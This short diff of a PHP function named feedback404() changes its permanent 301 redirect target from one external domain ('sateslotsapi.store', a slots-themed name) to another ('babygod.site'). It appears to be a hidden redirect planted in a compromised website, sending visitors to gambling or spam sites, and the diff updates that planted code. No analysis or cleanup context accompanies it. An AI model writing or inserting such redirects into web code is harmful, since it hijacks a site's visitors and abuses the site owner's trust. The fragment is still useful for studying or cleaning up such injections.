@@ -3,7 +3,7 @@
     function feedback404()
     {
     header("HTTP/1.1 301 Moved Permanently");
-    header("Location: https://sateslotsapi.store");
+    header("Location: https://babygod.site");
     header("Connection: close");
 
     }
